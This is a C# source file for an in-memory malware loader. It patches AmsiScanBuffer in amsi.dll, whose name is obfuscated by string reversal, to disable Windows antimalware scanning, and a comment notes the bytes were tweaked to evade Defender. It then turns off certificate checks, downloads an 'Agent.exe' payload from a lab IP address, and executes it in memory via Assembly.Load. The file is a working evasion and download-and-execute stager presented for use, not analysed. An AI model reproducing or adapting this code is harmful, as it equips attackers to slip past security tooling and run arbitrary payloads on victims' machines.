using System;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

// this is to load ayyyyygent via assembly.load
namespace Loader
{
    public class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true)]
        public static extern IntPtr GetProcAddress(
    IntPtr hModule,
    string procName
);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpfOldProtect);


        public static void Main()
        {
            if (!HelloTest()) { return; }
            ServicePointManager.ServerCertificateValidationCallback = (a, b, c, d) => true;
            var data = DownloadAttemptOne("http://192.168.56.102:9000/Agent.exe");
            if (data == null) { return; }
            if (!LoadAttemptOne(data)) { return; }
        }
        public static byte[] DownloadAttemptOne(string url)
        {
            try
            {
                byte[] dataBytes;
                using (var client = new WebClient())
                {
                    dataBytes = client.DownloadData(url);
                }
                return dataBytes;
            }
            catch
            {
                return null;
            }
        }
        public static bool HelloTest()
        {
            byte[] patchs;
            patchs = new byte[6] { 0x50, 0x58, 0x53, 0x5B, 0x90, 0xC3 };
            // confirmed works. needed to change the bytes to stop the blue shield.
            try
            {
                string l = "lld." + "ism" + "a";
                string f = "re" + "ff" + "uBnac" + "Sis" + "mA";
                char[] larray = l.ToCharArray();
                Array.Reverse(larray);
                l = new string(larray);
                char[] farray = f.ToCharArray();
                Array.Reverse(farray);
                f = new string(farray);
                var lib = LoadLibrary(l);
                var addr = GetProcAddress(lib, f);
                if (addr == null){return true;}
                uint oldProtect;
                if (!VirtualProtect(addr, patchs.Length, 0x40, out oldProtect)){return false;}
                Marshal.Copy(patchs, 0, addr, patchs.Length);
                if (!VirtualProtect(addr, patchs.Length, oldProtect, out oldProtect)){return false;}
                return true;
            }
            catch 
            {
                return false;

            }
        }
        public static bool LoadAttemptOne(byte[] asm, string[] args = null)
        {
            if (args is null)
            {
                args = new string[] { };
            }
            var assembly = Assembly.Load(asm);
            assembly.EntryPoint.Invoke(null, new object[] { args });
            return true;
        }
    }
}
